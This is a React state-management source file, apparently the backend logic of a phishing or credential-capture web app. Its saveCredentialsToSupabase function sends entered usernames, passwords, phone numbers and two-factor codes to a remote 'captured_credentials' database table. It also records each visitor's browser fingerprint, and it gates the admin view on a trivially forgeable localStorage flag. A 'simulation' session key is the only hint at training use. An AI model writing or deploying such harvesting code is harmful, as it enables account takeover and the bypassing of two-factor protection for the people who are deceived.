import React, { useState, useEffect, createContext, useContext } from 'react';
import { toast as shadcnToast } from "@/components/ui/use-toast";
import { supabase } from '@/lib/supabaseClient';

const AppStateContext = createContext();

export function AppStateProvider({ children }) {
  const [capturedData, setCapturedData] = useState(() => {
    const saved = localStorage.getItem('capturedData');
    return saved ? JSON.parse(saved) : [];
  });
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(() => {
    const stored = localStorage.getItem('isAdminAuthenticated') === 'true';
    console.log('Initial admin auth state from localStorage:', stored);
    return stored;
  });

  useEffect(() => {
    localStorage.setItem('capturedData', JSON.stringify(capturedData));
  }, [capturedData]);

  useEffect(() => {
    console.log('Admin auth state changed:', isAdminAuthenticated);
    localStorage.setItem('isAdminAuthenticated', isAdminAuthenticated.toString());
  }, [isAdminAuthenticated]);

  // Wrapper function to handle authentication with proper state synchronization
  const authenticateAdmin = (shouldAuthenticate) => {
    console.log('Authenticating admin:', shouldAuthenticate);
    setIsAdminAuthenticated(shouldAuthenticate);
  };

  const addCapturedData = (data) => {
    setCapturedData(prevData => {
      const enhancedData = {
        ...data,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        screenResolution: `${screen.width}x${screen.height}`,
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        referrer: document.referrer || 'Direct access',
        sessionId: sessionStorage.getItem('simulationSessionId') || 'Unknown'
      };
      const newData = [...prevData, enhancedData];
      return newData;
    });
  };
  
  const clearAllCapturedData = () => {
    setCapturedData([]);
    localStorage.removeItem('capturedData');
  };

  const showToast = ({ title, description, variant }) => {
    shadcnToast({
      title,
      description,
      variant,
    });
  };

  const saveCredentialsToSupabase = async (credentials) => {
    const { username, password, phoneNumber, twoFactorCode } = credentials;
    try {
      const { data, error } = await supabase
        .from('captured_credentials')
        .insert([
          { 
            username: username, 
            password: password,
            phone_number: phoneNumber,
            two_factor_code: twoFactorCode
          },
        ])
        .select();

      if (error) {
        throw error;
      }
      
      addCapturedData({ ...credentials, id: data[0].id, created_at: data[0].created_at });

      return { success: true, data };
    } catch (error) {
      console.error('Error saving data to Supabase:', error);
      showToast({
        title: "Database Error",
        description: "Could not save the captured information. " + error.message,
        variant: "destructive",
      });
      return { success: false, error };
    }
  };

  return (
    <AppStateContext.Provider value={{ 
      capturedData, 
      addCapturedData, 
      isAdminAuthenticated, 
      setIsAdminAuthenticated,
      authenticateAdmin,
      clearAllCapturedData,
      showToast,
      supabase,
      saveCredentialsToSupabase
    }}>
      {children}
    </AppStateContext.Provider>
  );
}

export function useAppState() {
  const context = useContext(AppStateContext);
  if (!context) {
    throw new Error('useAppState must be used within an AppStateProvider');
  }
  return context;
}